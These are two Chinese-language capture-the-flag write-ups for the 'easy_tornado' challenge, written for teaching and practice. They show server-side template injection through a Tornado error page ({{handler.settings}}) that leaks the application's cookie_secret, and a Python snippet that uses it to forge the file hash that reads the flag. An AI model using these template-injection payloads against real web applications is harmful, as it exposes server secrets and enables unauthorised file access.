1.查看主页面

 [![](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171244384-2105501773.png)](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171244384-2105501773.png)

2.查看其他页面，/welcome.txt

http://111.198.29.45:39004/file?filename=/welcome.txt&filehash=9aeecdd1844b70a3c4c719d2303cfaeb

 [![](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171239530-304397140.png)](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171239530-304397140.png)

/hints.txt

http://111.198.29.45:39004/file?filename=/hints.txt&filehash=9226131c021e8a84f91c65972c94ca3b

 [![](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171236232-491097478.png)](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171236232-491097478.png)

/flag.txt

http://111.198.29.45:39004/file?filename=/flag.txt&filehash=ed15d1deebc3e76eaf460728563f05d7

 [![](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171231073-1709366133.png)](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171231073-1709366133.png)

3.从上面三个页面来看

flag在/fllllllllllllag文件中

url中的filehash是md5(cookie_secret+md5(filename))

可以构造payload为：file?filename=/fllllllllllllag&filehash=********************

filename已知道，只差filehash

4.直接输入/fllllllllllllag尝试，url跳转页面为

 [![](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171223430-722454064.png)](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171223430-722454064.png)

5./welcome.txt页面看到render，可能会是SSTI模板注入

SSTI模板注入详情：https://blog.csdn.net/zz_Caleb/article/details/96480967

尝试验证：

传递error?msg={{2}}，页面出现2

[![](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171207286-270462963.png)](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171207286-270462963.png)

传递error?msg={{2*3}}，页面出现ORZ（但并不是cookie）  
尝试除和减操作符也是）返回ORZ，说明是操作符背过滤了。

 [![](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171204839-559868891.png)](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171204839-559868891.png)

6.通过模板注入如何拿到tornado中的cookie，用的就是handler.settings对象

handler 指向RequestHandler

而RequestHandler.settings又指向self.application.settings

所有handler.settings就指向RequestHandler.application.settings了！

传递error?msg={{ handler.settings }}得到：

 [![](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171155689-116575536.png)](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171155689-116575536.png)

7.使用md5加密构造计算出filehash的值，md5(cookie_secret+md5(/fllllllllllllag))

 [![](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171149872-1092482698.png)](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171149872-1092482698.png)

8.传递参数得到flag

 [![](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171127991-1370394729.png)](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171127991-1370394729.png)

# easy_tornado

## **[环境]**

windows

## **[工具]**

Firefox

## **[步骤]**

tornado是python中的一个web应用框架。

拿到题目发现有三个文件：

![](https://adworld.xctf.org.cn/media/task/writeup/cn/easytornado/1.png)

flag.txt

```
/flag.txt
flag in /fllllllllllllag
```

发现flag在/fllllllllllllag文件里；

welcome.txt

```
/welcome.txt
render
```

render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。

hints.txt

```
/hints.txt
md5(cookie_secret+md5(filename))
```

filehash=md5(cookie_secret+md5(filename))  
现在filename=/fllllllllllllag，只需要知道cookie_secret的既能访问flag。

测试后发现还有一个error界面，格式为/error?msg=Error，怀疑存在服务端模板注入攻击 （SSTI）

尝试/error?msg={{datetime}}  
在Tornado的前端页面模板中，datetime是指向python中datetime这个模块，Tornado提供了一些对象别名来快速访问对象，可以参考Tornado官方文档

![](https://adworld.xctf.org.cn/media/task/writeup/cn/easytornado/2.png)

通过查阅文档发现cookie_secret在Application对象settings属性中，还发现self.application.settings有一个别名

```
RequestHandler.settings
An alias for self.application.settings.
```

handler指向的处理当前这个页面的RequestHandler对象，  
RequestHandler.settings指向self.application.settings，  
因此handler.settings指向RequestHandler.application.settings。

构造payload获取cookie_secret

```
/error?msg={{handler.settings}}
```

![](https://adworld.xctf.org.cn/media/task/writeup/cn/easytornado/3.png)

```
'cookie_secret': 'M)Z.>}{O]lYIp(oW7$dc132uDaK<C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r'
```

计算filehash值:

```
import hashlib

def md5(s):
 md5 = hashlib.md5() 
 md5.update(s) 
 return md5.hexdigest()
 
def filehash():
 filename = '/fllllllllllllag'
 cookie_secret = 'M)Z.>}{O]lYIp(oW7$dc132uDaK<C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r'
 print(md5(cookie_secret+md5(filename)))
 
if __name__ == '__main__':
 filehash()
```

payload：

```
file?filename=/fllllllllllllag&filehash=md5(cookie_secret+md5(/fllllllllllllag))
```

成功获取flag。